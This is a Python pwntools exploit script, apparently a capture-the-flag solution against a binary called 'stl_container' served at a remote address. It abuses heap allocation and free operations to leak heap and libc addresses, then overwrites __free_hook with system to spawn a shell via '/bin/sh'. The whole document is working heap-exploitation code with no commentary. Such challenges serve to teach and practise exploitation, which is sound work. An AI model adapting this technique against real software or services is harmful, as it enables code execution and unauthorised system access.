from pwn import *
context.log_level = 'debug'

def go(pay):
    p.sendlineafter('>> ', pay)

def add(tp, data):
    go(str(tp))
    go('1')
    p.sendafter(':', data)

def delete(tp, idx):
    go(str(tp))
    go('2')
    p.sendlineafter('index?\n', str(idx))

def show(tp, idx):
    go(str(tp))
    go('3')
    p.sendlineafter('index?\n', str(idx))

#p = process('./stl_container')
p = remote('134.175.239.26', 8848)
e = ELF('./stl_container')
l = e.libc

# leak heap base
add(1, 'a'*0x90)
add(1, 'b'*0x90)
delete(1, 0)
delete(1, 0)
add(1, 'x')
show(1, 0)

p.recvuntil('data: ')
heap = u64(p.recv(6).ljust(8, '\x00')) - 0x12578
log.info('heap : '+hex(heap))

tar = heap + 0x12540

# leak libc base
add(1, '1'*0x90)
for i in range(2, 5):
    add(i, '1'*0x90)
    add(i, '1'*0x90)

for i in range(2):
    go('4')
    go('2')
    go('3')
    go('2')

delete(2, 0)
delete(2, 0)
delete(1, 0)
add(2, p64(tar+0x10))
add(2, 'y')
show(2, 0)

p.recvuntil('data: ')
libc = u64(p.recv(6).ljust(8, '\x00')) - 0x3ebca0
log.info('libc : '+hex(libc))

delete(2, 0)
delete(2, 0)
add(2, p64(libc+l.sym['__free_hook']))
delete(1, 0)
add(1, '/bin/sh\x00')
add(3, p64(libc+l.sym['system']))
delete(1, 0)

p.interactive()
